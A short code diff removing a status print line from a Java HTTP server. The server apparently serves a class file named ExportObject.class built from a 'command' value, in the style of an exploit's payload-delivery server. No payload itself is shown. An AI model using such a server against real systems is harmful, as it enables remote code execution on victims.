@@ -16,7 +16,6 @@ public class MyHttpServer {
 			httpServer.createContext("/ExportObject.class", new HttpFileHandler(command));
 			httpServer.setExecutor(null);
 			httpServer.start();
-			System.out.println("[+] HTTP server listening on " + host.getHostAddress() + ":" + port);
 		} catch (IOException e) {
 			System.out.println("[-] Exception: " + e.getMessage());
 			e.printStackTrace();
